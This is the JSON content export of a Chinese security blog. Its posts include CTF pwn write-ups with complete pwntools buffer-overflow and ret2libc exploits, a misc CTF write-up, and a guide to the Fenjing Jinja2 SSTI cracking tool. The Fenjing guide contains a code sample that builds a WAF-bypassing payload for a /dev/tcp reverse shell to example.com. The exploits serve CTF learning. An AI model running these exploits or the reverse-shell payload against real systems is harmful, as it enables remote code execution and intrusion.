{"meta":{"title":"yixinBC's blog","subtitle":"always learning","description":"yixinBC的个人博客","author":"yixinBC","url":"https://yixinbc.tech","root":"/"},"pages":[],"posts":[{"title":"暑期第一周刷题","slug":"暑期第一周刷题","date":"2023-07-13T20:14:37.000Z","updated":"2023-07-13T12:20:11.764Z","comments":true,"path":"2023/07/13/暑期第一周刷题/","link":"","permalink":"https://yixinbc.tech/2023/07/13/%E6%9A%91%E6%9C%9F%E7%AC%AC%E4%B8%80%E5%91%A8%E5%88%B7%E9%A2%98/","excerpt":"","text":"get_started_3dsctf_2016一开始以为是ret2text板子题（那么大个get_flag函数）。照板子写，打远程，没回显，报错。检查发现函数的返回方式不是leave retn而是retn，遂将fake_ebp的padding去除。没打通。翻网上的题解，发现有师傅提到这题的远程只有程序能正常退出的时候才有回显（确实是老题了，这几年的新题不会这么离谱😅）。遂将get_flag函数的返回地址设置为elf.sym[&quot;exit&quot;]。get_flag函数开头有一个if判断： 原始思路是直接ret2text的时候越过if判断，注意到汇编中此函数在retn前有pop esi，函数开头有push esi，想法是把栈构造成下面这样: stack_overflow_padding 0x38 ret2txet_addr(after elf.sym[“get_flag”]) fake_pop_esi elf.sym[“exit”] 不知为何打不通。老老实实过if判断： stack_overflow_padding 0x38 elf.sym[“get_flag”] elf.sym[“exit”] get_flag arg1 0x308CD64F get_flag arg2 0x195719D1 最后exp如下： 12345678910111213141516from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;elf = ELF(&quot;./get_started_3dsctf_2016&quot;)# p = process(&quot;./get_started_3dsctf_2016&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 27999)sleep(1)p.send( b&quot;a&quot; * 0x38 + p32(elf.sym[&quot;get_flag&quot;]) + p32(elf.sym[&quot;exit&quot;]) + p32(0x308CD64F) + p32(0x195719D1))p.interactive() [OGeek2019]babyrop32位ret2libc，write泄露，这题因为send和sendline的原因卡了好久，下次写脚本准备先无脑上sendline了 脚本如下： 1234567891011121314151617181920212223242526from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;# p = process(&quot;./pwn&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 26926)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.23.so&quot;)p.sendline(b&quot;\\x00&quot; + b&quot;\\xff&quot; * 7)p.recvuntil(b&quot;Correct\\n&quot;)p.sendline( b&quot;a&quot; * (0xE7 + 4) + p32(elf.plt[&quot;write&quot;]) + p32(0x08048825) # main + p32(1) + p32(elf.got[&quot;write&quot;]) + p32(4))write_addr = u32(p.recv(4))libc_base = write_addr - libc.sym[&quot;write&quot;]system_addr = libc_base + libc.sym[&quot;system&quot;]binsh_addr = libc_base + libc.search(b&quot;/bin/sh&quot;).__next__()p.sendline(b&quot;\\x00&quot; + b&quot;\\xff&quot; * 7)p.recvuntil(b&quot;Correct\\n&quot;)p.sendline(b&quot;a&quot; * (0xE7 + 4) + p32(system_addr) + p32(0xDEADBEEF) + p32(binsh_addr))p.interactive() [HarekazeCTF2019]baby_rop64位rop板子题。注意程序里有/bin/sh字符串，可以在ida的strings页面找到。远程flag的位置很怪啊，学习了一下find命令。不知道为什么远程交互的时候过没几秒没操作就会eof exp如下： 123456789101112131415161718from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;# p = process(&quot;./babyrop&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 26515)elf = ELF(&quot;./babyrop&quot;)pop_rdi = 0x400683p.sendlineafter( b&quot;What&#x27;s your name? &quot;, b&quot;A&quot; * 0x10 + b&quot;B&quot; * 8 + p64(pop_rdi) + p64(elf.sym[&quot;binsh&quot;]) + p64(elf.plt[&quot;system&quot;]),)p.interactive()","categories":[],"tags":[]},{"title":"SCTF2023 MISC 部分Writeup","slug":"SCTF2023","date":"2023-06-20T15:58:15.000Z","updated":"2023-07-13T12:20:11.760Z","comments":true,"path":"2023/06/20/SCTF2023/","link":"","permalink":"https://yixinbc.tech/2023/06/20/SCTF2023/","excerpt":"","text":"checkin010修改一下压缩包，把第一个经过压缩算法的flag&#x2F;改为flag（record和dirEntry里的都要改）。改完直接用Windows资源管理器开会报错（大概是修得不完美），但是能用7zip解压出来flag文件。打开发现是个压缩包，flag直接明文存在1.txt，所以用010打开能直接看见flag Fly over the Fuchun River查看图片，可以看到飞机编号B-32DC，通过flightaware查询可知是成都航空的航班，查询其四月的历史飞行记录：https://zh.flightaware.com/live/flight/B32DC/history/320 ，根据题目fuchun river，可知此时在杭州，又题目中的拍摄时间为12:15，可查找到一定期的航班CTU-&gt;HGH，且该班次有些晚点，符合的天数只剩4.3、4.7、4.13、4.17。在携程上可以查到该班次航班号为EU2259。枚举一下日期，即可得到flag为SCTF&#123;CTU_HGH_EU2259_413&#125;","categories":[],"tags":[],"author":"yixinBC"},{"title":"fenjing(焚靖)——jinja2 SSTI一把梭","slug":"fenjing","date":"2023-05-11T18:36:24.000Z","updated":"2023-07-13T12:20:11.760Z","comments":true,"path":"2023/05/11/fenjing/","link":"","permalink":"https://yixinbc.tech/2023/05/11/fenjing/","excerpt":"","text":"焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能 安装使用pip（最省事）12pip install fenjingpython -m fenjing scan --url &#x27;http://xxx/&#x27; 也可下载并运行docker镜像12docker pull marven11/fenjingdocker run --net host -it marven11/fenjing scan --url &#x27;http://xxx/&#x27; 还可以直接下载源码12git clone https://github.com/Marven11/Fenjingcd Fenjing 下载后可以选择直接使用（先确保用pip安装完依赖） 1python -m pip install -r requirements.txt 也可以手动构建一个docker镜像 12docker build -t fenjing .docker run -it --net host fenjing scan --url &#x27;http://xxx/&#x27; 使用12345678910111213141516171819202122232425262728293031323334$ python -m fenjing --helpUsage: python -m fenjing [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: crack 攻击指定的表单 scan 扫描指定的网站$ python -m fenjing crack --helpUsage: python -m fenjing crack [OPTIONS] 攻击指定的表单Options: -u, --url TEXT form所在的URL -a, --action TEXT form的action，默认为当前路径 -m, --method TEXT form的提交方式，默认为POST -i, --inputs TEXT form的参数，以逗号分隔 -e, --exec-cmd TEXT 成功后执行的shell指令，不填则成功后进入交互模式 --interval FLOAT 每次请求的间隔 --user-agent TEXT 请求时使用的User Agent --help Show this message and exit.$ python -m fenjing scan --helpUsage: python -m fenjing scan [OPTIONS] 扫描指定的网站Options: -u, --url TEXT 需要扫描的URL -e, --exec-cmd TEXT 成功后执行的shell指令，不填则进入交互模式 --interval FLOAT 每次请求的间隔 --user-agent TEXT 请求时使用的User Agent --help Show this message and exit. 也可做为一个python模块集成进脚本中使用 12345678910111213141516171819202122from fenjing import exec_cmd_payloadimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str): blacklist = [ &quot;config&quot;, &quot;self&quot;, &quot;g&quot;, &quot;os&quot;, &quot;class&quot;, &quot;length&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;request&quot;, &quot;lipsum&quot;, &quot;[&quot;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &quot;_&quot;, &quot;.&quot;, &quot;+&quot;, &quot;~&quot;, &quot;&#123;&#123;&quot;, &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;０&quot;,&quot;１&quot;,&quot;２&quot;,&quot;３&quot;,&quot;４&quot;,&quot;５&quot;,&quot;６&quot;,&quot;７&quot;,&quot;８&quot;,&quot;９&quot; ] for word in blacklist: if word in s: return False return Truepayload, _ = exec_cmd_payload(waf, &quot;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\\&quot;&quot;)print(payload) 支持的绕过 &#39;和&quot;的绕过 绝大部分关键字的绕过 自然数的绕过 下划线_ +和- ~ [下标访问的绕过 &#123;&#123;&#125;&#125;标签的绕过 使用示例[GDOUCTF 2023]&lt;ez_ze&gt;打开题目发现是一个使用POST提交表单的网页，检查响应头的Sever字段，发现是Werkzeug/2.2.3 Python/3.8.16，所以应该是一个flask程序，考虑SSTI。使用一些常见的jinja2 SSTI payload，发现都会被WAF给过滤。尝试焚靖一把梭： 123456789101112131415161718$ python -m fenjing crack -u http://node1.anna.nssctf.cn:28140/get_flag -i name ____ _ _ / __/__ ____ (_|_)___ ____ _ / /_/ _ \\/ __ \\ / / / __ \\/ __ `/ / __/ __/ / / / / / / / / / /_/ //_/ \\___/_/ /_/_/ /_/_/ /_/\\__, / /___/ /____/...INFO:[cli] | Use Ctrl+D to exit.$&gt;&gt; cat /flag...Hello, $ NSSCTF&#123;82377006-eb0f-4ebd-9a9f-ba6ad3ba7c17&#125; $!$&gt;&gt; 可见焚靖的WAF绕过能力还是非常强大的 参考资料Marven11&#x2F;Fenjing: 一个类似SQLMap的Jinja2 SSTI利用脚本 | A SQLMap-like Jinja2 SSTI cracker（官方GitHub页面） 想找一个通用的SSTI payload生成器？可以去尝试一下tplmap","categories":[],"tags":[],"author":"yixinBC"},{"title":"Hexo + volantis配置","slug":"hello-world","date":"2023-04-21T15:00:00.000Z","updated":"2023-07-13T12:20:11.760Z","comments":true,"path":"2023/04/21/hello-world/","link":"","permalink":"https://yixinbc.tech/2023/04/21/hello-world/","excerpt":"","text":"移步GitHub 仓库查看配置文件源码。","categories":[],"tags":[],"author":"yixinBC"}],"categories":[],"tags":[]}